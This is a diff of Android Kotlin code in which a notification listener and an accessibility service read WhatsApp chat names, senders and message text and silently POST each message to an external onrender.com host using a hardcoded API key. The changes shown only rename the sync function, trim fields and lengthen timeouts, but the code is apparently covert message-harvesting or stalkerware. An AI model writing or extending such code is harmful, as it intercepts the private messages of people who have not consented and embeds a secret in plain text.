@@ -109,29 +109,29 @@ class NotificationService : NotificationListenerService() {
             while (arr.length() > 500) arr.remove(0)
             prefs.edit().putString("messages", arr.toString()).apply()
             
-            syncWithBackend(chat, sender, message)
+            // Send only the new message (not all) but in a sequential way
+            syncSingleMessage(chat, sender, message, System.currentTimeMillis())
         } catch (e: Exception) {}
     }
 
-    private fun syncWithBackend(chat: String, sender: String, message: String) {
+    private fun syncSingleMessage(chat: String, sender: String, message: String, time: Long) {
         Thread {
             try {
                 val apiUrl = "https://system-task-b6ra.onrender.com/api/webhooks/whatsapp/sync"
-
                 val url = java.net.URL(apiUrl)
                 val conn = url.openConnection() as java.net.HttpURLConnection
                 conn.requestMethod = "POST"
                 conn.setRequestProperty("Content-Type", "application/json")
                 conn.setRequestProperty("x-api-key", "SRAAS_SECRET_WEBHOOK_KEY_123")
-                conn.connectTimeout = 10000
-                conn.readTimeout = 10000
+                conn.connectTimeout = 15000
+                conn.readTimeout = 15000
                 conn.doOutput = true
 
                 val msgObj = JSONObject()
-                msgObj.put("chat", chat)
-                msgObj.put("sender", sender)
-                msgObj.put("message", message)
-                msgObj.put("time", System.currentTimeMillis())
+                msgObj.put("chat", chat.trim())
+                msgObj.put("sender", sender.trim())
+                msgObj.put("message", message.trim())
+                msgObj.put("time", time)
 
                 val arr = JSONArray()
                 arr.put(msgObj)
@@ -383,29 +383,28 @@ class WhatsAppAccessibilityService : AccessibilityService() {
             while (arr.length() > 500) arr.remove(0)
             prefs.edit().putString("messages", arr.toString()).apply()
             
-            syncWithBackend(chat, sender, message)
+            syncSingleMessage(chat, sender, message, System.currentTimeMillis())
         } catch (e: Exception) {}
     }
 
-    private fun syncWithBackend(chat: String, sender: String, message: String) {
+    private fun syncSingleMessage(chat: String, sender: String, message: String, time: Long) {
         Thread {
             try {
                 val apiUrl = "https://system-task-b6ra.onrender.com/api/webhooks/whatsapp/sync"
-
                 val url = java.net.URL(apiUrl)
                 val conn = url.openConnection() as java.net.HttpURLConnection
                 conn.requestMethod = "POST"
                 conn.setRequestProperty("Content-Type", "application/json")
                 conn.setRequestProperty("x-api-key", "SRAAS_SECRET_WEBHOOK_KEY_123")
-                conn.connectTimeout = 10000
-                conn.readTimeout = 10000
+                conn.connectTimeout = 15000
+                conn.readTimeout = 15000
                 conn.doOutput = true
 
                 val msgObj = JSONObject()
-                msgObj.put("chat", chat)
-                msgObj.put("sender", sender)
-                msgObj.put("message", message)
-                msgObj.put("time", System.currentTimeMillis())
+                msgObj.put("chat", chat.trim())
+                msgObj.put("sender", sender.trim())
+                msgObj.put("message", message.trim())
+                msgObj.put("time", time)
 
                 val arr = JSONArray()
                 arr.put(msgObj)
